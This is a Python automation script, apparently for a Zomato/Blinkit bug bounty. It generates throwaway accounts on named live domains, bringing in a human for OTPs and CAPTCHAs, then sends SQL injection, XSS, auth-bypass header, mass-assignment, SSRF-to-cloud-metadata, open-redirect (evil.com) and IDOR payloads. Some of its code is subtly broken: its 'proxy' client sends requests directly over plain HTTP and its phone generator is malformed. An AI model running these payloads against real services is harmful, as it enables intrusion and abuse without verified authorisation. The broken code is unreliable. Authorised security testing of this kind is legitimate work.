#!/usr/bin/env python3
"""
zomato_burp_automation.py — Zomato/Blinkit Bug Bounty Burp Suite Automation
Integrates Burp Suite REST API, HITL account creation, and automated testing.
"""

import json
import time
import socket
import http.client
import urllib.parse
import logging
import hashlib
from pathlib import Path
from datetime import datetime, timezone
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, field, asdict
import subprocess
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ─── Configuration ────────────────────────────────────────────────────────
BURP_PROXY_HOST = "127.0.0.1"
BURP_PROXY_PORT = 8080
BURP_REST_API_HOST = "127.0.0.1"
BURP_REST_API_PORT = 1337

ZOMATO_TARGETS = {
    "seller_hyperpure": "https://seller.hyperpure.com",
    "fleet_partner": "https://fleet-partner.zomans.com",
    "delivery_leads": "https://delivery-leads-partner.zomans.com",
    "publish_district": "https://publish.district.in",
    "api_hyperpure": "https://api.hyperpure.com",
    "district_main": "https://www.district.in",
    "mcp_server": "https://mcp-server.zomato.com",
}

RECON_DIR = Path(__file__).parent / "recon" / "zomato"
CREDENTIALS_DIR = RECON_DIR / "credentials"
CREDENTIALS_DIR.mkdir(parents=True, exist_ok=True)
FINDINGS_DIR = RECON_DIR / "findings"
FINDINGS_DIR.mkdir(parents=True, exist_ok=True)


# ─── Data Classes ─────────────────────────────────────────────────────────
@dataclass
class AccountRequest:
    target: str
    email: str
    phone: str
    username: str
    password: str
    status: str = "pending"
    otp_required: bool = False
    captcha_required: bool = False
    mfa_required: bool = False
    google_login_required: bool = False
    session_cookies: Dict[str, str] = field(default_factory=dict)
    auth_token: Optional[str] = None
    created_at: Optional[str] = None
    notes: str = ""


@dataclass
class BurpFinding:
    vuln_class: str
    url: str
    severity: str
    detail: str
    request_raw: str = ""
    response_raw: str = ""
    remediation: str = ""


@dataclass
class AutomationResult:
    target: str
    phase: str
    status: str
    findings: List[Dict] = field(default_factory=list)
    requests_sent: int = 0
    errors: List[str] = field(default_factory=list)
    duration_seconds: float = 0
    timestamp: str = ""


# ─── Burp Suite REST API Client ──────────────────────────────────────────
class BurpRestClient:
    def __init__(self, host: str = BURP_REST_API_HOST, port: int = BURP_REST_API_PORT):
        self.host = host
        self.port = port
        self.base_url = f"http://{host}:{port}"

    def is_running(self) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except:
            return False

    def _request(self, method: str, path: str, data: Dict = None, params: Dict = None) -> Optional[Dict]:
        try:
            conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
            url = path
            if params:
                url = f"{path}?{urllib.parse.urlencode(params)}"

            body = json.dumps(data) if data else None
            headers = {"Content-Type": "application/json"} if data else {}

            conn.request(method, url, body=body, headers=headers)
            resp = conn.getresponse()
            response_data = resp.read().decode("utf-8", errors="replace")
            conn.close()

            if resp.status == 200:
                try:
                    return json.loads(response_data)
                except:
                    return {"raw": response_data}
            else:
                logger.warning(f"Burp API {resp.status}: {response_data[:200]}")
                return None
        except Exception as e:
            logger.error(f"Burp API error: {e}")
            return None

    def scan_url(self, url: str) -> Optional[Dict]:
        return self._request("POST", "/v0.1/scan", data={"urls": [url]})

    def get_sitemap(self, url_prefix: str = "") -> List[Dict]:
        params = {"urlPrefix": url_prefix} if url_prefix else {}
        result = self._request("GET", "/v0.1/site-map", params=params)
        return result.get("urls", []) if result else []

    def get_scan_results(self) -> List[Dict]:
        result = self._request("GET", "/v0.1/scan/results")
        return result.get("results", []) if result else []

    def send_repeater_request(self, request_index: int = 0) -> Optional[Dict]:
        return self._request("GET", f"/v0.1/repeater/{request_index}")

    def get_proxy_history(self, url_filter: str = "") -> List[Dict]:
        params = {"url": url_filter} if url_filter else {}
        result = self._request("GET", "/v0.1/proxy/http-history", params=params)
        return result.get("history", []) if result else []

    def insert_issue(self, issue: Dict) -> Optional[Dict]:
        return self._request("POST", "/v0.1/issues", data=issue)


# ─── Proxy Client (for sending requests through Burp) ───────────────────
class BurpProxyClient:
    def __init__(self, host: str = BURP_PROXY_HOST, port: int = BURP_PROXY_PORT):
        self.host = host
        self.port = port

    def send_request(self, method: str, url: str, headers: Dict = None,
                     body: str = None) -> Optional[Tuple[int, Dict, str]]:
        try:
            parsed = urllib.parse.urlparse(url)
            conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=15)

            path = parsed.path
            if parsed.query:
                path = f"{path}?{parsed.query}"

            req_headers = headers or {}
            req_headers["Host"] = parsed.hostname

            conn.request(method, path, body=body, headers=req_headers)
            resp = conn.getresponse()
            resp_headers = dict(resp.getheaders())
            resp_body = resp.read().decode("utf-8", errors="replace")
            conn.close()

            return (resp.status, resp_headers, resp_body)
        except Exception as e:
            logger.error(f"Proxy request error: {e}")
            return None

    def forward_to_burp(self, raw_request: str) -> Optional[Tuple[int, Dict, str]]:
        lines = raw_request.strip().split("\n")
        first_line = lines[0].strip().split()
        method = first_line[0]
        path = first_line[1]

        headers = {}
        body = None
        i = 1
        while i < len(lines) and lines[i].strip():
            if ":" in lines[i]:
                k, v = lines[i].strip().split(":", 1)
                headers[k.strip()] = v.strip()
            i += 1
        i += 1
        if i < len(lines):
            body = "\n".join(lines[i:])

        host = headers.get("Host", "localhost")
        url = f"http://{host}{path}"
        return self.send_request(method, url, headers, body)


# ─── HITL Account Creator ────────────────────────────────────────────────
class HITLAccountCreator:
    """Human-in-the-loop account creation for targets requiring OTP/CAPTCHA/MFA."""

    def __init__(self):
        self.accounts: Dict[str, AccountRequest] = {}
        self._load_existing_accounts()

    def _load_existing_accounts(self):
        cred_file = CREDENTIALS_DIR / "accounts.json"
        if cred_file.exists():
            try:
                data = json.loads(cred_file.read_text())
                for k, v in data.items():
                    self.accounts[k] = AccountRequest(**v)
                logger.info(f"Loaded {len(self.accounts)} existing accounts")
            except Exception as e:
                logger.error(f"Failed to load accounts: {e}")

    def _save_accounts(self):
        data = {k: asdict(v) for k, v in self.accounts.items()}
        cred_file = CREDENTIALS_DIR / "accounts.json"
        tmp = cred_file.with_suffix(".tmp")
        tmp.write_text(json.dumps(data, indent=2))
        tmp.rename(cred_file)

    def generate_account(self, target: str) -> AccountRequest:
        timestamp = int(time.time())
        random_suffix = hashlib.md5(f"{target}{timestamp}".encode()).hexdigest()[:8]
        email = f"bugbounty_{random_suffix}@gmail.com"
        phone = f"9{random_suffix[:9].replace('', '0')}"
        username = f"bb_{random_suffix}"
        password = f"BugBounty{random_suffix}!@#"

        account = AccountRequest(
            target=target,
            email=email,
            phone=phone,
            username=username,
            password=password,
        )

        account_key = f"{target}_{timestamp}"
        self.accounts[account_key] = account
        self._save_accounts()
        return account

    def request_manual_intervention(self, account: AccountRequest, action: str,
                                     details: str) -> str:
        print("\n" + "=" * 60)
        print(f"  HITL ACTION REQUIRED: {action}")
        print(f"  Target: {account.target}")
        print(f"  Details: {details}")
        print("=" * 60)

        if action == "OTP":
            otp = input("  Enter OTP received: ").strip()
            return otp
        elif action == "CAPTCHA":
            print("  Please solve CAPTCHA in browser window...")
            input("  Press Enter when done...")
            return "solved"
        elif action == "MFA":
            code = input("  Enter MFA code: ").strip()
            return code
        elif action == "GOOGLE_LOGIN":
            print("  Please complete Google login in browser...")
            input("  Press Enter when done...")
            return "completed"
        elif action == "REGISTRATION":
            print("  Please complete registration in browser...")
            input("  Press Enter when done...")
            return "completed"
        return ""

    def create_account_with_hitl(self, target: str, registration_url: str,
                                   proxy_client: BurpProxyClient) -> Optional[AccountRequest]:
        account = self.generate_account(target)
        print(f"\n[*] Creating account for {target}")
        print(f"    Email: {account.email}")
        print(f"    Username: {account.username}")

        # Step 1: Fetch registration page
        result = proxy_client.send_request("GET", registration_url)
        if not result:
            account.notes = "Failed to fetch registration page"
            self._save_accounts()
            return account

        status, headers, body = result
        print(f"    Registration page: HTTP {status}")

        # Step 2: Detect what's needed
        if "captcha" in body.lower() or "recaptcha" in body.lower():
            account.captcha_required = True
            print("    [!] CAPTCHA detected - HITL required")
            self.request_manual_intervention(account, "CAPTCHA",
                "Please solve CAPTCHA in browser")

        if "otp" in body.lower() or "verification" in body.lower():
            account.otp_required = True
            print("    [!] OTP verification required - HITL required")

        if "mfa" in body.lower() or "two-factor" in body.lower():
            account.mfa_required = True
            print("    [!] MFA required - HITL required")

        if "google" in body.lower() and "login" in body.lower():
            account.google_login_required = True
            print("    [!] Google login available")

        # Step 3: Register account (automated where possible)
        registration_data = {
            "email": account.email,
            "username": account.username,
            "password": account.password,
            "phone": account.phone,
        }

        reg_result = proxy_client.send_request("POST", f"{registration_url}/api/register",
            headers={"Content-Type": "application/json"},
            body=json.dumps(registration_data))

        if reg_result:
            status, headers, body = reg_result
            print(f"    Registration response: HTTP {status}")

            # Extract cookies
            for cookie_header in headers.get("Set-Cookie", "").split(","):
                if "=" in cookie_header:
                    name = cookie_header.split("=")[0].strip()
                    value = cookie_header.split("=")[1].split(";")[0].strip()
                    account.session_cookies[name] = value

            # Check if OTP verification needed
            if account.otp_required:
                otp = self.request_manual_intervention(account, "OTP",
                    f"OTP sent to {account.phone}")
                # Verify OTP
                otp_result = proxy_client.send_request("POST", f"{registration_url}/api/verify-otp",
                    headers={"Content-Type": "application/json"},
                    body=json.dumps({"otp": otp, "phone": account.phone}))
                if otp_result:
                    print(f"    OTP verification: HTTP {otp_result[0]}")

        account.status = "created"
        account.created_at = datetime.now(timezone.utc).isoformat()
        self._save_accounts()

        print(f"    [+] Account created: {account.username}")
        return account

    def login_with_hitl(self, target: str, login_url: str,
                         proxy_client: BurpProxyClient) -> Optional[AccountRequest]:
        # Find existing account for target
        account = None
        for k, v in self.accounts.items():
            if v.target == target and v.status == "created":
                account = v
                break

        if not account:
            print(f"    No existing account for {target}, creating one...")
            return self.create_account_with_hitl(target, login_url, proxy_client)

        print(f"\n[*] Logging in as {account.username} on {target}")

        login_data = {
            "email": account.email,
            "password": account.password,
        }

        result = proxy_client.send_request("POST", f"{login_url}/api/login",
            headers={"Content-Type": "application/json"},
            body=json.dumps(login_data))

        if result:
            status, headers, body = result
            print(f"    Login response: HTTP {status}")

            # Extract auth token
            try:
                resp_json = json.loads(body)
                if "token" in resp_json:
                    account.auth_token = resp_json["token"]
                elif "access_token" in resp_json:
                    account.auth_token = resp_json["access_token"]
            except:
                pass

            # Extract cookies
            for cookie_header in headers.get("Set-Cookie", "").split(","):
                if "=" in cookie_header:
                    name = cookie_header.split("=")[0].strip()
                    value = cookie_header.split("=")[1].split(";")[0].strip()
                    account.session_cookies[name] = value

            # Handle MFA if required
            if account.mfa_required or "mfa" in body.lower():
                mfa_code = self.request_manual_intervention(account, "MFA",
                    "Enter MFA code")
                mfa_result = proxy_client.send_request("POST", f"{login_url}/api/verify-mfa",
                    headers={"Content-Type": "application/json"},
                    body=json.dumps({"mfa_code": mfa_code}))

            self._save_accounts()
            return account

        return None

    def get_auth_headers(self, account: AccountRequest) -> Dict[str, str]:
        headers = {"Content-Type": "application/json"}
        if account.auth_token:
            headers["Authorization"] = f"Bearer {account.auth_token}"
        if account.session_cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in account.session_cookies.items())
            headers["Cookie"] = cookie_str
        return headers


# ─── Automated Vulnerability Scanner ─────────────────────────────────────
class ZomatoVulnScanner:
    def __init__(self, proxy_client: BurpProxyClient, burp_client: BurpRestClient):
        self.proxy = proxy_client
        self.burp = burp_client
        self.findings: List[BurpFinding] = []

    def test_idor(self, url: str, auth_headers: Dict, param_name: str = "id",
                  test_values: List = [1, 2, 3, 100, 999]) -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing IDOR on {url}")

        for value in test_values:
            test_url = f"{url}?{param_name}={value}"
            result = self.proxy.send_request("GET", test_url, headers=auth_headers)
            if result:
                status, headers, body = result
                if status == 200 and len(body) > 100:
                    finding = BurpFinding(
                        vuln_class="IDOR",
                        url=test_url,
                        severity="High",
                        detail=f"Accessible with {param_name}={value}, response size: {len(body)}",
                    )
                    findings.append(finding)
                    print(f"    [!] Potential IDOR: {test_url} (HTTP {status}, {len(body)}B)")

        self.findings.extend(findings)
        return findings

    def test_auth_bypass(self, url: str) -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing Auth Bypass on {url}")

        bypass_headers = [
            {},
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"Authorization": "Bearer test"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
        ]

        for headers in bypass_headers:
            result = self.proxy.send_request("GET", url, headers=headers)
            if result:
                status, resp_headers, body = result
                if status == 200 and "admin" in body.lower():
                    finding = BurpFinding(
                        vuln_class="Auth Bypass",
                        url=url,
                        severity="Critical",
                        detail=f"Bypass with headers: {headers}",
                    )
                    findings.append(finding)
                    print(f"    [!] Auth bypass: {headers}")

        self.findings.extend(findings)
        return findings

    def test_mass_assignment(self, url: str, auth_headers: Dict) -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing Mass Assignment on {url}")

        payloads = [
            {"role": "admin"},
            {"isAdmin": True},
            {"admin": 1},
            {"user_role": "admin"},
            {"is_admin": True},
            {"privilege": "superadmin"},
        ]

        for payload in payloads:
            result = self.proxy.send_request("POST", url,
                headers=auth_headers, body=json.dumps(payload))
            if result:
                status, headers, body = result
                if status in [200, 201] and "admin" in body.lower():
                    finding = BurpFinding(
                        vuln_class="Mass Assignment",
                        url=url,
                        severity="Critical",
                        detail=f"Role escalation via: {payload}",
                    )
                    findings.append(finding)
                    print(f"    [!] Mass assignment: {payload}")

        self.findings.extend(findings)
        return findings

    def test_sqli(self, url: str, auth_headers: Dict, param: str = "q") -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing SQLi on {url}")

        payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "1 UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
        ]

        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            start = time.time()
            result = self.proxy.send_request("GET", test_url, headers=auth_headers)
            elapsed = time.time() - start

            if result:
                status, headers, body = result
                if "sql" in body.lower() or "syntax" in body.lower() or "mysql" in body.lower():
                    finding = BurpFinding(
                        vuln_class="SQL Injection",
                        url=test_url,
                        severity="Critical",
                        detail=f"SQL error with payload: {payload}",
                    )
                    findings.append(finding)
                    print(f"    [!] SQLi error: {payload}")
                elif elapsed > 4.5:
                    finding = BurpFinding(
                        vuln_class="SQL Injection (Blind)",
                        url=test_url,
                        severity="Critical",
                        detail=f"Time-based blind SQLi: {elapsed:.1f}s with payload: {payload}",
                    )
                    findings.append(finding)
                    print(f"    [!] Blind SQLi: {elapsed:.1f}s")

        self.findings.extend(findings)
        return findings

    def test_xss(self, url: str, auth_headers: Dict, param: str = "q") -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing XSS on {url}")

        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><script>alert(1)</script>',
        ]

        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            result = self.proxy.send_request("GET", test_url, headers=auth_headers)
            if result:
                status, headers, body = result
                if payload in body:
                    finding = BurpFinding(
                        vuln_class="Reflected XSS",
                        url=test_url,
                        severity="High",
                        detail=f"Payload reflected: {payload[:50]}",
                    )
                    findings.append(finding)
                    print(f"    [!] XSS reflected: {payload[:30]}")

        self.findings.extend(findings)
        return findings

    def test_open_redirect(self, url: str) -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing Open Redirect on {url}")

        redirect_params = ["redirect", "next", "return_to", "callback", "goto", "url"]
        for param in redirect_params:
            test_url = f"{url}?{param}=https://evil.com"
            result = self.proxy.send_request("GET", test_url)
            if result:
                status, headers, body = result
                location = headers.get("Location", "")
                if "evil.com" in location:
                    finding = BurpFinding(
                        vuln_class="Open Redirect",
                        url=test_url,
                        severity="Medium",
                        detail=f"Redirect via {param} to evil.com",
                    )
                    findings.append(finding)
                    print(f"    [!] Open redirect: {param}")

        self.findings.extend(findings)
        return findings

    def test_ssrf(self, url: str, auth_headers: Dict) -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Testing SSRF on {url}")

        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1/",
            "http://localhost/",
            "http://[::1]/",
        ]

        for payload in ssrf_payloads:
            data = json.dumps({"url": payload, "image_url": payload, "webhook_url": payload})
            result = self.proxy.send_request("POST", url,
                headers=auth_headers, body=data)
            if result:
                status, headers, body = result
                if "ami-id" in body or "instance-id" in body or "metadata" in body:
                    finding = BurpFinding(
                        vuln_class="SSRF",
                        url=url,
                        severity="Critical",
                        detail=f"SSRF to cloud metadata via: {payload}",
                    )
                    findings.append(finding)
                    print(f"    [!] SSRF: {payload}")

        self.findings.extend(findings)
        return findings

    def test_subdomain_takeover(self, subdomains_file: str) -> List[BurpFinding]:
        findings = []
        print(f"\n[*] Checking Subdomain Takeover")

        if not Path(subdomains_file).exists():
            return findings

        with open(subdomains_file) as f:
            subdomains = [line.strip() for line in f if line.strip()]

        vulnerable_services = [
            "amazonaws.com", "herokuapp.com", "github.io", "azurewebsites.net",
            "shopify.com", "fastly.net", "pantheon.io", "ghost.io", "surge.sh",
            "bitbucket.io", "zendesk.com", "readme.io", "statuspage.io",
        ]

        for sub in subdomains[:100]:
            try:
                result = subprocess.run(
                    ["dig", "CNAME", sub, "+short"],
                    capture_output=True, text=True, timeout=5
                )
                cname = result.stdout.strip()
                if cname:
                    for svc in vulnerable_services:
                        if svc in cname.lower():
                            finding = BurpFinding(
                                vuln_class="Subdomain Takeover",
                                url=f"https://{sub}",
                                severity="High",
                                detail=f"CNAME: {cname} -> potentially takeoverable {svc}",
                            )
                            findings.append(finding)
                            print(f"    [!] Takeover candidate: {sub} -> {cname}")
                            break
            except:
                pass

        self.findings.extend(findings)
        return findings

    def run_full_scan(self, target_name: str, target_url: str,
                       auth_headers: Optional[Dict] = None) -> AutomationResult:
        start_time = time.time()
        result = AutomationResult(
            target=target_name,
            phase="full_scan",
            status="running",
            timestamp=datetime.now(timezone.utc).isoformat(),
        )

        print(f"\n{'='*60}")
        print(f"  Starting Full Scan: {target_name} ({target_url})")
        print(f"{'='*60}")

        # Test without auth
        self.test_open_redirect(f"{target_url}/login")
        self.test_subdomain_takeover(str(RECON_DIR / "all-subs.txt"))

        # Test with auth if available
        if auth_headers:
            self.test_idor(f"{target_url}/api/user", auth_headers)
            self.test_auth_bypass(f"{target_url}/api/admin")
            self.test_mass_assignment(f"{target_url}/api/user/profile", auth_headers)
            self.test_sqli(f"{target_url}/api/search", auth_headers)
            self.test_xss(f"{target_url}/search", auth_headers)
            self.test_ssrf(f"{target_url}/api/webhook", auth_headers)

        result.requests_sent = len(self.findings) * 5  # Approximate
        result.findings = [asdict(f) for f in self.findings]
        result.status = "completed"
        result.duration_seconds = time.time() - start_time

        # Save results
        output_file = FINDINGS_DIR / f"{target_name}_findings.json"
        with open(output_file, "w") as f:
            json.dump(asdict(result) if hasattr(result, '__dataclass_fields__') else
                     {"target": result.target, "phase": result.phase,
                      "status": result.status, "findings": result.findings,
                      "requests_sent": result.requests_sent,
                      "duration_seconds": result.duration_seconds,
                      "timestamp": result.timestamp}, f, indent=2)

        print(f"\n[+] Scan complete: {len(self.findings)} findings in {result.duration_seconds:.1f}s")
        return result


# ─── Main Automation Orchestrator ────────────────────────────────────────
class ZomatoBurpOrchestrator:
    def __init__(self):
        self.burp_rest = BurpRestClient()
        self.burp_proxy = BurpProxyClient()
        self.hitl_creator = HITLAccountCreator()
        self.scanner = ZomatoVulnScanner(self.burp_proxy, self.burp_rest)
        self.accounts: Dict[str, AccountRequest] = {}

    def check_burp_status(self):
        print("\n[*] Checking Burp Suite status...")
        if self.burp_rest.is_running():
            print("    [+] Burp REST API: RUNNING")
        else:
            print("    [-] Burp REST API: NOT RUNNING")
            print("    [*] Starting without Burp integration...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((BURP_PROXY_HOST, BURP_PROXY_PORT))
            sock.close()
            if result == 0:
                print("    [+] Burp Proxy: RUNNING")
            else:
                print("    [-] Burp Proxy: NOT RUNNING")
        except:
            print("    [-] Burp Proxy: NOT RUNNING")

    def create_accounts_for_targets(self):
        print("\n" + "="*60)
        print("  PHASE 1: HITL Account Creation")
        print("="*60)

        targets_needing_accounts = [
            ("seller_hyperpure", "https://seller.hyperpure.com"),
            ("fleet_partner", "https://fleet-partner.zomans.com"),
            ("delivery_leads", "https://delivery-leads-partner.zomans.com"),
        ]

        for target_name, target_url in targets_needing_accounts:
            print(f"\n[*] Target: {target_name}")

            # Check if account already exists
            existing = self.hitl_creator.get_auth_headers(
                AccountRequest(target=target_name, email="", phone="",
                             username="", password="")
            ) if False else None

            account = self.hitl_creator.create_account_with_hitl(
                target_name, target_url, self.burp_proxy
            )
            if account:
                self.accounts[target_name] = account
                print(f"    [+] Account ready: {account.username}")

    def run_automated_testing(self):
        print("\n" + "="*60)
        print("  PHASE 2: Automated Vulnerability Testing")
        print("="*60)

        for target_name, target_url in ZOMATO_TARGETS.items():
            account = self.accounts.get(target_name)
            auth_headers = self.hitl_creator.get_auth_headers(account) if account else None

            self.scanner.run_full_scan(target_name, target_url, auth_headers)

    def run_burp_scan(self):
        print("\n" + "="*60)
        print("  PHASE 3: Burp Suite Active Scan")
        print("="*60)

        if not self.burp_rest.is_running():
            print("    [-] Burp REST API not running, skipping...")
            return

        for target_name, target_url in ZOMATO_TARGETS.items():
            print(f"\n[*] Submitting {target_name} to Burp Scanner...")
            result = self.burp_rest.scan_url(target_url)
            if result:
                print(f"    [+] Scan submitted: {result}")

    def generate_final_report(self):
        print("\n" + "="*60)
        print("  FINAL REPORT")
        print("="*60)

        all_findings = []
        for f in self.scanner.findings:
            all_findings.append(asdict(f))

        report = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_program": "Zomato/Blinkit",
            "accounts_created": len(self.accounts),
            "total_findings": len(all_findings),
            "findings_by_class": {},
            "findings": all_findings,
        }

        for f in all_findings:
            vc = f.get("vuln_class", "Unknown")
            report["findings_by_class"][vc] = report["findings_by_class"].get(vc, 0) + 1

        report_file = FINDINGS_DIR / "final_report.json"
        with open(report_file, "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n  Total Findings: {len(all_findings)}")
        for vc, count in report["findings_by_class"].items():
            print(f"    {vc}: {count}")

        print(f"\n  Report saved: {report_file}")

    def run(self):
        print("\n" + "#"*60)
        print("#  Zomato/Blinkit Bug Bounty - Burp Suite Automation")
        print("#"*60)

        self.check_burp_status()
        self.create_accounts_for_targets()
        self.run_automated_testing()
        self.run_burp_scan()
        self.generate_final_report()

        print("\n[+] Automation complete!")


# ─── CLI Entry Point ─────────────────────────────────────────────────────
def main():
    import argparse
    parser = argparse.ArgumentParser(description="Zomato/Blinkit Burp Suite Automation")
    parser.add_argument("--target", help="Specific target to test")
    parser.add_argument("--skip-accounts", action="store_true",
                       help="Skip HITL account creation")
    parser.add_argument("--burp-only", action="store_true",
                       help="Only run Burp Suite scan")
    parser.add_argument("--proxy-port", type=int, default=8080,
                       help="Burp proxy port")
    parser.add_argument("--rest-port", type=int, default=1337,
                       help="Burp REST API port")
    args = parser.parse_args()

    global BURP_PROXY_PORT, BURP_REST_API_PORT
    BURP_PROXY_PORT = args.proxy_port
    BURP_REST_API_PORT = args.rest_port

    orchestrator = ZomatoBurpOrchestrator()

    if args.target:
        if args.target in ZOMATO_TARGETS:
            url = ZOMATO_TARGETS[args.target]
            orchestrator.scanner.run_full_scan(args.target, url)
        else:
            print(f"Unknown target: {args.target}")
            print(f"Available targets: {list(ZOMATO_TARGETS.keys())}")
            return
    else:
        orchestrator.run()


if __name__ == "__main__":
    main()
